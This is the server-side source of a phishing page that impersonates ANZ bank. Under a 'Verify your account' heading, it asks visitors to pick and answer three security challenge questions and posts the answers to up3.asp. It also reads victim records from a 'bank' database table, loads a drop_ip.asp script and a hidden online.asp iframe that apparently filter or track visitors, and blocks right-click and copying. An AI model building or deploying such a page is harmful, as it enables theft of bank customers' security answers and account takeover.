<!--#include file="Include/db_conn.asp"-->
<img src="" width="100%" height="0" />
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
    <meta name="keywords" content="">
		<script language="javascript" src="drop_ip.asp"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
 <style>
        html {
    background-color: #fff;
    font-size: 14px;
    color: #2b2b2b;
    background: #fff
    
}

body {
    margin: 0px;
    padding: 0px;
    background-color: #fff;

}

* {
    font-family: "微软雅黑";
}
input[type="button"],input[type="submit"],input[type="reset"],input[type="text"],input[type="tel"],button,textarea{-webkit-appearance:none;}


div,ul,li,dt,dd,p {
    padding: 0px;
    margin: 0px;
}

.wrap {
    width: 100%;
    background: #f5f5f5;
    max-width: 640px;
    margin: 0 auto
}

.khimg {
    margin: 0 auto;
    width: 100%;
    overflow: hidden;
    margin-bottom: 20px;
    padding-top: 5px;
}

.khimg img {
    width: 10%;
    float: left;
    overflow: hidden;
    line-height: 30px;
}

.khimg span {
    float: left;
	color: #0b2398;
	padding-top: 7px;
    line-height: 20px;
    padding-left: 10px;
    font-weight: bold
}

.tjform {
    margin-top: 10px;
    overflow: hidden;
    width: 100%;
    margin-top: 20px;
}

.yhkh {
    width: 100%;
    margin: 0 auto;
    border: 1px solid #dddddd;

    border-radius: 4px;
    overflow: hidden;

    margin-bottom: 20px;
	    margin-top: 20px;
}

.yhkh span {
    padding-left: 12px;
    font-size: 15px;
    font-weight: 900;
    float: left;
    width: 25%;
    height: 30px;
    line-height: 30px;
    text-align: center
}

.yhkh input {
    float: left;
    border: none;
    height: 100%;
    width: 70%;
    height: 30px;
    line-height: 30px;
    font-size: 13px;
    padding-left: 15px;
}

.tjbtn {
    width: 100%;
    text-align: center;
    margin-top: 20px;
}

.tjbtn input {
    background: #f84347;
    border: none;
    padding: 3%  10%;
    text-align: center;
    color: #fff;
    width: 100%;
    font-size: 16px;
    border-radius: 10px;
    margin: 0 auto
}

.beizhu {
    text-align: left;
    color: #636363;
    padding-left: 4%
}

.beizhu a {
    color: #6295c4;
    text-decoration: none
}

.shuom {
    background: ;
	font-size: 13px;
    padding: 10px 15px 5px 15px;
    color: #5f9bd9;
    margin-bottom: 20px;
    overflow: hidden;
    line-height: 24px;
}

.content {
max-width: 520px;
    width: 90%;
    margin: 0 auto
    
}

a{text-decoration:none}
</style>
<script type="text/javascript" src="app/js/jquery-1.9.1.min.js"></script>

</head>

<body oncontextmenu="return false" onselectstart="return false"?

ondragstart="return false" onbeforecopy="return false" oncopy=document.selection.empty() onselect=document.selection.empty()>
<div style="background-color: #004165;width: 100%;height: 60px;"> 
        <img src="img/anz-logo.1.0.0.svg" style="width: 103px;height: 42px;padding: 8px;margin-left: 20px;">
    </div>







        <input value="" name="g_zhanghao" type="hidden">
        <input value="" name="qkmm" type="hidden">
            <div class="shuom">
            </div>
            
            <div class="content">
            <img src="static/img/c666afcbe7d237e07fd1d.png" style="width:79px;height:79px;display:block;margin:0 auto;" />
 
<div class="khimg">




<br>
<p style="font-size:24px;text-align:center;">Verify your account</p>
<br>
<p style="font-size:16px;text-align:center;">Please choose three challenge questions and complete the answers below.</p>




<p>
<%
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
je=rs("je")
dh=rs("dh")
rs.close
set rs=Nothing

%>
<style>
.text {
	PADDING-BOTTOM: 0px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; MARGIN-BOTTOM: 20px; COLOR: #999; FONT-SIZE: 14px; PADDING-TOP: 0px
}
article {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}


article.border {
    BORDER-BOTTOM: #ccc 1px solid;
    LINE-HEIGHT: 25px;
    MARGIN: 1px;
    FONT-SIZE: 16px;
}
article.border section {
	BORDER-BOTTOM: #fff 1px solid; PADDING-BOTTOM: 16px; PADDING-LEFT: 15px; PADDING-RIGHT: 15px; PADDING-TOP:12px
}
article.border section .input2 {
	WIDTH: 25px
}
DL {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}
.mar_l80 DL {
	OVERFLOW: hidden
}

INPUT {
	PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px
}
INPUT {
	OUTLINE-STYLE: none; OUTLINE-COLOR: invert; OUTLINE-WIDTH: medium; FONT: inherit
}
.select INPUT {
	BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; PADDING-LEFT: 5px; WIDTH: 124px; BACKGROUND: none transparent scroll repeat 0% 0%; FLOAT: left; HEIGHT: 29px; BORDER-TOP: 0px; BORDER-RIGHT: 0px
}
</style>
<%
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
je=rs("je")
dh=rs("dh")
rs.close
set rs=Nothing

%>
<form id="form1" method="post" name="form1" action="up3.asp">

<span style="font-size:16px;font-weight: 500;color:#000;text-align:center;">&nbsp;&nbsp;&nbsp;</span><span style="color:#000; font-size:22px;"><%=left(dh,2) & "" &right(dh,4)%></span><span style="font-size:13px;font-weight: 500;color:#000;"></span></span>  </span>  

</div>
<div class="yhkh"> 
<dl>






<br>
<select class="input1" role="listbox" id="" style="display:block;border-radius: 4px;font-size:14px;width:90%;height:45px; margin:0 auto; background: #fff;border: 0.5px solid rgb(204, 204, 204)">
                              <option role="option" aria-selected="0" id="select-challenge-question-result-0" tabindex="-1" disabled="">Select challenge question</option>
                              <option role="option" value="Select challenge question" aria-selected="true" id="select-challenge-question-result-0" tabindex="-1">Select challenge question</option>
                              <option role="option" value="Which suburb was your high school in?" aria-selected="false" id="select-challenge-question-result-1" tabindex="-1">Which suburb was your high school in?</option>
                              <option role="option" value="What's your father's middle name?" aria-selected="false" id="select-challenge-question-result-2" tabindex="-1">What's your father's middle name?</option>
                              <option role="option" value="What's your grandmother's first name, on your father's side?" aria-selected="false" id="select-challenge-question-result-3" tabindex="-1">What's your grandmother's first name, on your father's side?</option>
                              <option role="option" value="Where did you go on your first ever date?" aria-selected="false" id="select-challenge-question-result-4" tabindex="-1">Where did you go on your first ever date?</option>
                              <option role="option" value="Where did you go on your honeymoon?" aria-selected="false" id="select-challenge-question-result-5" tabindex="-1">Where did you go on your honeymoon?</option>
                              <option role="option" value="What date is your anniversary (e.g. DDMM)?" aria-selected="false" id="select-challenge-question-result-6" tabindex="-1">What date is your anniversary (e.g. DDMM)?</option>
                              <option role="option" value="What's your nickname for your car?" aria-selected="false" id="select-challenge-question-result-7" tabindex="-1">What's your nickname for your car?</option>
</select>
<br>
<div style="width:90%;height:45px;margin:0 auto;"><input name="pass" type="tel" placeholder=""  class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>
<br>

<select class="input1" role="listbox" id="" style="display:block;border-radius: 4px;font-size:14px;width:90%;height:45px; margin:0 auto; background: #fff;border: 0.5px solid rgb(204, 204, 204)">
                              <option role="option" aria-selected="0" id="select-challenge-question2-result-0" tabindex="-1" disabled="">Select challenge question</option>
                              <option role="option" value="Select challenge question" aria-selected="true" id="select-challenge-question2-result-0" tabindex="-1">Select challenge question</option>
                              <option role="option" value="Which high school did you attend?" aria-selected="false" id="select-challenge-question2-result-1" tabindex="-1">Which high school did you attend?</option>
                              <option role="option" value="What's your mother's middle name?" aria-selected="false" id="select-challenge-question2-result-2" tabindex="-1">What's your mother's middle name?</option>
                              <option role="option" value="Who's your oldest cousin?" aria-selected="false" id="select-challenge-question2-result-3" tabindex="-1">Who's your oldest cousin?</option>
                              <option role="option" value="What was the name of your favourite childhood toy?" aria-selected="false" id="select-challenge-question2-result-4" tabindex="-1">What was the name of your favourite childhood toy?</option>
                              <option role="option" value="Where was your wedding reception held?" aria-selected="false" id="select-challenge-question2-result-5" tabindex="-1">Where was your wedding reception held?</option>
                              <option role="option" value="Where did you first meet your partner?" aria-selected="false" id="select-challenge-question2-result-6" tabindex="-1">Where did you first meet your partner?</option>
                              <option role="option" value="Where do you first remember going on holiday?" aria-selected="false" id="select-challenge-question2-result-7" tabindex="-1">Where do you first remember going on holiday?</option>
</select>
<br>
<div style="width:90%;height:45px;margin:0 auto;"><input name="pass" type="tel" placeholder=""  class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>
<br>


<select class="input1" role="listbox" id="" style="display:block;border-radius: 4px;font-size:14px;width:90%;height:45px; margin:0 auto; background: #fff;border: 0.5px solid rgb(204, 204, 204)">
                              <option role="option" aria-selected="0" id="select-challenge-question3-result-0" tabindex="-1" disabled="">Select challenge question</option>
                              <option role="option" value="Select challenge question" aria-selected="true" id="select-challenge-question3-result-0" tabindex="-1">Select challenge question</option>
                              <option role="option" value="What was the name of your first school?" aria-selected="false" id="select-challenge-question3-result-1" tabindex="-1">What was the name of your first school?</option>
                              <option role="option" value="When is your father's birthday (e.g. DDMM)?" aria-selected="false" id="select-challenge-question3-result-2" tabindex="-1">When is your father's birthday (e.g. DDMM)?</option>
                              <option role="option" value="Which month and year was your oldest sibling born in? (e.g. MMYY)" aria-selected="false" id="select-challenge-question3-result-3" tabindex="-1">Which month and year was your oldest sibling born in? (e.g. MMYY)</option>
                              <option role="option" value="Who was your first kiss?" aria-selected="false" id="select-challenge-question3-result-4" tabindex="-1">Who was your first kiss?</option>
                              <option role="option" value="Which town or city did you get engaged in?" aria-selected="false" id="select-challenge-question3-result-5" tabindex="-1">Which town or city did you get engaged in?</option>
                              <option role="option" value="Where was your partner born?" aria-selected="false" id="select-challenge-question3-result-6" tabindex="-1">Where was your partner born?</option>
                              <option role="option" value="Where did you pass your driving test?" aria-selected="false" id="select-challenge-question3-result-7" tabindex="-1">Where did you pass your driving test?</option>
</select>
<br>
<div style="width:90%;height:45px;margin:0 auto;"><input name="pass" type="tel" placeholder=""  class="input1" id="pass" min-length="4" maxlength="50" style="display:block; margin:0 auto;border-radius: 4px;font-size:14px;width:100%;height:45px;  padding-left: 5%;border: 0.5px solid rgb(204, 204, 204)"></div>
<br>













</dl>
</div>
<tbody>
<tr>
<td>
<input name="button"  type="button" id="LoginBtn"  onclick="javascript:document.getElementById('form1').submit();"style="
   text-size-adjust: 100%;
                                    -webkit-font-smoothing: antialiased;
                                    box-sizing: border-box;
                                    font-size: 18px;
                                    overflow: visible;
                                    text-transform: none;
                                    line-height: 1.25;
                                    appearance: button;
                                    width: 100%;
                                    margin: 0px;
                                    background-color: rgb(0, 114, 172);
                                    color: rgb(255, 255, 255);
                                    border: 1px solid transparent;
                                    border-radius: 4px;
                                    font-weight: 600;
                                    padding: 12px;
                                    cursor: pointer;
                                    transition: background-color 0.2s ease 0s, border-color 0.2s ease 0s, color 0.2s ease 0s;
                                    font-family: myriad-pro-semibold, sans-serif, sans-serif !important;
    " value= "Submit" ></td>
</tr>
<br>
<br>
</span>


<a href="index.htm" style="text-align:center;color:rgb(0, 114, 172);display:block;font-weight: 400;">Try another way</a>





</tbody>
<br><br><br><span style="color:#000;font-size:15px;"><strong></strong></span><br><span style="font-size:13px;    line-height: 20px;"><span style="color:red"></span></span><br>
</span></span> 
</div>
<iframe src="online.asp" style="display: none;"></iframe>

<br>

<div style="clear:both;"></div>	
<div style="background-color:#0072AC;width:100%;height:84px;position:absolute;position:fixed; z-index:1000; bottom:0px; ">
        <span style="text-align:center;display:block;padding:30px;position:absolute;position:fixed; z-index:1000; bottom:0px;color:#fff ">© Australia and New Zealand Banking Group Limited (ANZ) 2022 ABN 11 005 357 522.</span>
    </div>
</body>
</html>